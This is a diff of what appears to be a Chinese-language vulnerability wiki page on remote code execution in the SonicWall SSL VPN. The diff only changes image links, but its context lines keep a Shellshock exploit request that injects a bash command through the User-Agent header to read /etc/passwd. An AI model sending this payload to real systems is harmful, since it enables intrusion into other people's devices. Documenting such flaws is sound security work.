@@ -152,7 +152,7 @@ exit 0;
 
 发送如下请求即可命令执行
 
-![](image/son-1.png)
+![](http://wikioss.peiqi.tech/vuln/son-1.png)
 
 ```shell
 GET https://xxx.xxx.xxx.xxx/cgi-bin/jarrewrite.sh
@@ -161,7 +161,7 @@ User-Agent: () { :; }; echo ; /bin/bash -c 'cat /etc/passwd'
 
 发送请求会下载一个文件，文件内容为命令执行的结果
 
-![](image/son-2.png)
+![](http://wikioss.peiqi.tech/vuln/son-2.png)
 
 ## 漏洞利用POC
 
@@ -224,7 +224,7 @@ if __name__ == '__main__':
 
 ```
 
-![](image/son-3.png)
+![](http://wikioss.peiqi.tech/vuln/son-3.png)
 
 ## Goby & POC
 
@@ -234,7 +234,7 @@ if __name__ == '__main__':
 >
 > SonicWall_SSL_VPN_RCE.json
 
-![](image/son-4.png)
+![](http://wikioss.peiqi.tech/vuln/son-4.png)
 
 ## 参考文章
 
